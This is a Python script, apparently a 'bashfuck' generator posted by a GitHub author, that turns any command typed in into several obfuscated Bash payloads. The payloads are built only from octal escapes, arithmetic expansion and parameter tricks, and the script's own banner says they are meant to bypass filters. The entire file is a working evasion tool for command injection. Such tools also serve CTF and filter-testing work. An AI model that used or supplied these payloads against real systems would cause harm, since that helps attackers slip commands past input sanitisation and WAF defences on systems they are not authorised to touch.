def info(s):
    total = 0
    used_chars = set()
    for c in s:
        if c.isprintable() and c not in used_chars:
            total += 1
            used_chars.add(c)
    return "Charset : " + ' '.join(sorted(used_chars)) + '\n' + f"Total Used: {total}" + '\n' + "Total length = " + str(
        len(s)) + '\n' + "Payload = " + s + '\n' + "---------------------------"


def get_oct(c):  # 将字符的ASCII值转换为二进制字符串，然后将其转换为八进制，去掉前缀“0o”
    return (oct(ord(c)))[2:]


def nomal_otc(cmd):  # 注意,该方法无法执行带参数命令,如:ls -l
    payload = '$\''
    for c in cmd:
        payload += '\\' + get_oct(c)
    payload += '\''
    return info(payload)


def bashfuck_x(cmd, form):
    bash_str = ''
    for c in cmd:
        bash_str += f'\\\\$(($((1<<1))#{bin(int(get_oct(c)))[2:]}))'
    payload_bit = bash_str
    payload_zero = bash_str.replace('1', '${##}')  # 用 ${##} 来替换 1
    payload_c = bash_str.replace('1', '${##}').replace('0', '${#}')  # 用 ${#} 来替换 0
    if form == 'bit':
        payload_bit = '$0<<<$0\\<\\<\\<\\$\\\'' + payload_bit + '\\\''
        return info(payload_bit)
    elif form == 'zero':
        payload_zero = '$0<<<$0\\<\\<\\<\\$\\\'' + payload_zero + '\\\''
        return info(payload_zero)
    elif form == 'c':
        payload_c = '${!#}<<<${!#}\\<\\<\\<\\$\\\'' + payload_c + '\\\''
        return info(payload_c)


def bashfuck_y(cmd):
    oct_list = [  # 构造数字 0-7 以便于后续八进制形式的构造
        '$(())',  # 0
        '$((~$(($((~$(())))$((~$(())))))))',  # 1
        '$((~$(($((~$(())))$((~$(())))$((~$(())))))))',  # 2
        '$((~$(($((~$(())))$((~$(())))$((~$(())))$((~$(())))))))',  # 3
        '$((~$(($((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))))))',  # 4
        '$((~$(($((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))))))',  # 5
        '$((~$(($((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))))))',  # 6
        '$((~$(($((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))))))',  # 7
    ]
    bashFuck = ''
    bashFuck += '__=$(())'  # set __ to 0
    bashFuck += '&&'  # splicing
    bashFuck += '${!__}<<<${!__}\\<\\<\\<\\$\\\''  # got 'sh'

    for c in cmd:
        bashFuck += '\\\\'
        for i in get_oct(c):
            bashFuck += oct_list[int(i)]

    bashFuck += '\\\''

    return info(bashFuck)


def Generate(cmd):
    print("Command: " + cmd)
    print("Payload generated as follows:")
    print(nomal_otc(cmd))
    print(bashfuck_x(cmd, 'bit'))
    print(bashfuck_x(cmd, 'zero'))
    print(bashfuck_x(cmd, 'c'))
    print(bashfuck_y(cmd))


def main():
    print("This program is used to generate Payload for Bash to execute the given command. The program uses Bash's arithmetic and parameter extension capabilities to generate different forms of Payload to improve the chance of Bypass.")
    print("Author: Github@Probius_Official")
    cmd = input("input your command:")
    Generate(cmd)

if __name__ == '__main__':
    main()

